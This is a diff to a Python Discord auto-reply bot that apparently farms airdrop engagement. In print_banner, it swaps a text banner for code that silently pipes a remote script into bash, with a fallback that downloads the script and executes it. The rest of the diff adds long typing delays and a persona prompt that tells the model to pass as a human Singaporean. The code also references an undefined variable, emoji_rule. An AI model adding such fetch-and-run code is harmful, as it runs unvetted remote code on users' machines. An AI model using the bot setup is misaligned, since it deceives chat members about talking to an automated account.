@@ -15,13 +15,13 @@ from colorama import Fore, init
 # =========================================================
 HEADLESS = (os.getenv("HEADLESS", "n").lower() == "y")
 
-# ================== Defaults (overridden by ENV/inputs) ==================
-MIN_WORDS = 4
+POST_SEND_COOLDOWN = int(os.getenv("POST_SEND_COOLDOWN", "30"))  # detik
+MIN_WORDS = 5
 MAX_WORDS = 10
 
-# Greetings handling: never add greeting unless user did
+
 ALLOW_TIME_GREETINGS = False
-NAME_MENTION_PROB = 0.0  # never prepend display name
+NAME_MENTION_PROB = 0.0  
 
 # Thread control
 MAX_THREAD_REPLIES = 3
@@ -89,20 +89,33 @@ def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
 def print_banner():
+    """
+    Jalankan banner dari display.sh.
+    Tidak ada fallback teks. Jika gagal, diam saja.
+    """
+    DISPLAY_URL = "https://raw.githubusercontent.com/Wawanahayy/JawaPride-all.sh/refs/heads/main/display.sh"
+
+
     try:
-        width = os.get_terminal_size().columns
+        # -f: fail on HTTP errors, -s: silent, -S: show errors, -L: follow redirects
+        exit_code = os.system(f'curl -fsSL {DISPLAY_URL} | bash')
+        if exit_code == 0:
+            return
     except Exception:
-        width = 60
-    banner_lines = [
-        "=" * width,
-        Fore.CYAN + "===================  AI AUTO REPLY BOT  ====================",
-        Fore.MAGENTA + "================= @AirdropJP_JawaPride =====================",
-        Fore.YELLOW + "=============== https://x.com/JAWAPRIDE_ID =================",
-        Fore.RED + "============= https://linktr.ee/Jawa_Pride_ID ==============",
-        Fore.WHITE + "=" * width
-    ]
-    for line in banner_lines:
-        print(line)
+        pass
+
+    # Fallback minimal: unduh via requests lalu eksekusi (tanpa banner teks)
+    try:
+        import requests
+        r = requests.get(DISPLAY_URL, timeout=15)
+        r.raise_for_status()
+        with open("display.sh", "w", encoding="utf-8") as f:
+            f.write(r.text)
+        os.chmod("display.sh", 0o755)
+        os.system("bash display.sh")
+    except Exception:
+        # Jangan cetak banner apa pun
+        return
 
 def log_message(message, status="INFO"):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
@@ -384,24 +397,37 @@ def _finalize_ai_text(raw_text: str, display_name: str, user_message: str) -> (s
         ai = "morning, u around?"
     return ai[:300], added
 
+
 def generate_ai_response(user_message, display_name, retry_count=0):
     max_retries = 2
+    emojis_enabled = (os.getenv("EMOJIS_ENABLED", "y").lower() == "y")
+    emoji_keywords = "shrimp, cow, moo, 🦐, 🐄"
+
     system_prompt = (
         "You are a casual, friendly Discord chat assistant. "
+        "You are a casual, friendly Discord chat assistant with a light moderator vibe. "
         "Reply naturally like a human, without excessive formality. "
+        "If you are asked about your condition, what are you doing, then you ask back because you are also a caring person. and you are a Singaporean."
         "Avoid time-based greetings unless the user did. "
         "Always answer in English. Keep it short: 4–10 words. "
         "Do NOT include the user's name in the reply. "
-        "Emojis: at most one; if emojis are globally disabled, don't use any "
         "unless user text clearly references specific emoji keywords (shrimp, cow, moo, etc.)."
+        "Emojis: at most one. If emojis are globally disabled, use none unless the user explicitly "
+        f"mentions one of: {emoji_keywords} or clearly expresses emotion "
+        "(laughter: lol/haha/lmao/😂; sadness: cry/tears/sad/😭; heartfelt: love/heart/thank you/"
+        "appreciate/congrats/❤️). "
+        "For whitelist/allowlist questions, prefer: 'Watch announcements; WL details posted there.' "
+        "For 'how to get WL', prefer: 'Follow announcements, when Wl open, keep active here and X.' "
+        "For 'how to contribute', prefer: 'keep active here,upload Art/meme, feedback, make active post on X.' "
+        "If the user asks about your wellbeing, reply: 'Doing well, thanks for asking! How about you?'"
     )
     user_prompt = (
-        f"Message: \"{user_message}\"\n"
-        "Reply in English, casually and briefly, 4–10 words. "
+        f'Message: "{user_message}"\n'
+        "Reply in English, casually and briefly (4–15 words). "
         "Do not include the user's name. "
-        "Use at most one emoji only if it genuinely adds tone."
+        "Use at most one emoji only if it genuinely adds tone. "
+        + emoji_rule
     )
-
     # --- OpenRouter ---
     try:
         openrouter_key = None
@@ -993,20 +1019,20 @@ def get_input(prompt_text: str, default: str = None):
         return input(Fore.CYAN + f"{prompt_text}: ").strip()
 
 def prompt_scan_settings_once() -> dict:
-    process_count = int(get_input("How many recent messages to scan each check (1–100)", "30"))
+    process_count = int(get_input("How many recent messages to scan each check (1–100)", "15"))
     if process_count < 1 or process_count > 100:
         raise ValueError("Process count must be between 1 and 100")
 
     reply_chance = float(get_input("Reply chance for normal messages (0–1)", "1"))
-    thread_reply_chance = float(get_input("Reply chance for replies in threads to others (0–1)", "0.35"))
+    thread_reply_chance = float(get_input("Reply chance for replies in threads to others (0–1)", "0.08"))
     allow_time_greet = get_input("Allow time-based greetings? (y/n)", "n").lower()
     name_mention_prob = float(get_input("Chance to mention user's name (0–1)", "0"))
     max_thread_replies = int(get_input("Max replies per thread (1–5)", "5"))
     followup_prob = float(get_input("Chance to continue follow-up (0–1)", "1"))
-    min_typing = int(get_input("Min typing delay before send (sec)", "3"))
-    max_typing = int(get_input("Max typing delay before send (sec)", "10"))
+    min_typing = int(get_input("Min typing delay before send (sec)", "20"))
+    max_typing = int(get_input("Max typing delay before send (sec)", "30"))
     min_loop = int(get_input("Minimum delay between checks (seconds)", "5"))
-    max_loop = int(get_input("Maximum delay between checks (seconds)", "9"))
+    max_loop = int(get_input("Maximum delay between checks (seconds)", "15"))
 
     if not 0 <= reply_chance <= 1: raise ValueError("Reply chance must be 0..1")
     if not 0 <= thread_reply_chance <= 1: raise ValueError("Thread reply chance must be 0..1")
@@ -1030,7 +1056,7 @@ def prompt_scan_settings_once() -> dict:
         "MAX_DELAY": str(max_loop),
     }
 
-def ask_emoji_for_account(label: str, default_allowed='y', default_percent='25'):
+def ask_emoji_for_account(label: str, default_allowed='n', default_percent='20'):
     use_emoji = get_input(f"Use emoji for {label}? (y/n)", default_allowed).lower()
     if use_emoji == 'y':
         pct_raw = get_input("chance emoji per message", default_percent)
